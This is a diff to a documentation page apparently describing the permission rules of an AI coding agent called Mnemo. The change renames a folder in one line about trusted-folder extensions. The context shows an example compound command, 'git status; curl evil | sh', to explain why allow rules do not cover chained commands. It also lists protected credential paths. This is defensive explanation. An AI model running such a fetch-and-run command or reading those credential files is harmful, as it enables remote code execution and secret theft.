@@ -44,7 +44,7 @@ const sections: DocSection[] = [
           <li><strong>Allow rules and "always" grants end on a word and never cover a compound command.</strong> <code>git status*</code> does not cover <code>git status; curl evil | sh</code>.</li>
           <li><strong><code>accept-edits</code> means edits inside this project.</strong> <code>.git</code>, <code>.pi</code>, <code>.agents</code>, <code>.mnemo</code>, <code>.github</code> and similar still ask, because what is written there runs later. Skills are always asked about.</li>
           <li><strong>Reads are free, except credentials.</strong> <code>read</code>, <code>grep</code>, <code>find</code> and <code>ls</code> never ask, but refuse Mnemo's own <code>auth.json</code>, <code>~/.ssh</code>, <code>~/.aws</code> and <code>~/.gnupg</code>. A shell command can still <code>cat</code> them if you approve it.</li>
-          <li><strong>A folder's own <code>.pi/</code> extensions, settings, prompts and skills run code and steer the model</strong>, so Mnemo loads them only for a folder you have trusted. Do not trust a repository you have not read.</li>
+          <li><strong>A folder's own <code>.agents/</code> extensions, settings, prompts and skills run code and steer the model</strong>, so Mnemo loads them only for a folder you have trusted. Do not trust a repository you have not read.</li>
           <li>A <code>permissions.json</code> that cannot be parsed stops all edits and commands until it is fixed, rather than quietly dropping your deny rules.</li>
         </ul>
       </>
